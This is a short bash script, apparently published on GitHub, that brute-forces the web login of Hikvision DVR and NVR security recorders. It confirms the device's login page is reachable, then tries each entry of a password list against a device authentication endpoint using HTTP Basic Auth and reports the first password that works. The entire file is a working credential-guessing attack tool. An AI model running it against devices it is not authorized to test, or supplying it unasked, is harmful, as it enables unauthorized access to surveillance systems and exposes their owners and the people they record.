#!/bin/bash

#Github: EarlyOwl/Hikvision-DVR-NVR-bruteforce
#ver 1.0.0 -- This script is licensed under the MIT License

# Default Configuration to use if no parameters are provided
IP="192.168.0.64"               # Default IP address of the system
USERNAME="admin"                # Default Username to use in login attempts
FILE_PATH="password_list.txt"   # Default path to the password list file

# Function to display usage
usage() {
    echo "Usage: $0 [-u USERNAME] [-i IP] [-f FILE_PATH]"
    echo "  -u USERNAME   Username to use in login attempts. Default: admin"
    echo "  -i IP         IP address of the system. Default: 192.168.0.64"
    echo "  -f FILE_PATH  Path to the password list file. Default: password_list.txt"
    exit 1
}

# Get command line options
while getopts ":u:i:f:" opt; do
  case ${opt} in
    u )
      USERNAME=$OPTARG
      ;;
    i )
      IP=$OPTARG
      ;;
    f )
      FILE_PATH=$OPTARG
      ;;
    \? )
      usage
      ;;
  esac
done

# Fetch the HTTP status code of the login page to check if it exists
status_code=$(curl --write-out '%{http_code}' --silent --output /dev/null "http://$IP/doc/page/login.asp")

# Check if the status code indicates success (200-299)
if [[ "$status_code" -ge 200 ]] && [[ "$status_code" -lt 300 ]]; then
    echo "Login page found, carrying on..."
else
    echo "Login page not found, exiting."
    exit 1
fi

# Loop through each line in the file
while IFS= read -r line
do
    # Encode the credentials in Base64
    ENCODED_CREDENTIALS=$(echo -n "$USERNAME:$line" | base64)
    
    # Send the HTTP GET request with the Basic Auth header and store the response
    RESPONSE=$(curl -s -X GET "http://$IP/PSIA/Custom/SelfExt/userCheck" -H "Authorization: Basic $ENCODED_CREDENTIALS")
    
    # Parse the response to check for a failure or success indication
    if echo "$RESPONSE" | grep -q "<statusValue>401</statusValue>"; then
        echo "Authentication failed for password: $line"
    else
        echo "Successful authentication with password: $line"
        break # Exit the loop if authentication is successful
    fi
done < "$FILE_PATH"